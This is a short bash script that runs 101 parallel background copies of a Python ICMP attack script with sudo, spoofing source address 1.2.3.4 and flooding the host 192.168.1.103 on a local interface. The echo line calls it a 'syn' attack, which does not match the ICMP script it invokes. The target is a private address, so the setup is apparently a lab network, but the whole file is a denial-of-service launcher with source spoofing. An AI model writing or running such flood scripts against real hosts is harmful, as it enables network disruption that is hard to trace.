#!/bin/bash

for i in {0..100}
do
	echo "starting syn n°$i..."
	sudo python ./attacks/icmp-attack.py -s 1.2.3.4 -d 192.168.1.103 -i enp0s3 &
done